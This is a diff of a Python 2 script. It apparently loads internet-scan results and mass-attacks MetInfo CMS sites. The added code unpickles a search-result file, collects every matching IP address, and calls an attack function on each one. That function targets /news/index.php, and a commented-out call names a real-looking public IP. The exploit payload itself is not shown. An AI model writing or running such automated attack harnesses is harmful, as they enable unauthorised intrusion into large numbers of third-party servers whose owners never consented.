@@ -5,6 +5,16 @@ import re
 #import requests
 import urllib2
 import json
+import pickle
+
+def readSearchResult(file):
+	f = open(file,"rb")
+	data = pickle.load(f)
+	print type(data)
+
+	#pprint.pprint(data1)
+	f.close()
+	return data
 
 def attack(url):
 	a = "http://{target}/news/index.php?".format(target=url)
@@ -59,3 +69,17 @@ def attack(url):
 		pass
 
 #attack("218.28.99.182")
+def main(file):
+	print "MetInfo running"
+	ip_list = []
+	data = readSearchResult(file)
+	j = 0
+	for _ in data:
+		for x in _['matches']:
+			#logger.info("find ip:" + x['ip'])
+			print x['ip']
+			ip_list.append(x['ip'])
+			j += 1
+	print j
+	for ip in ip_list:
+		attack(ip)
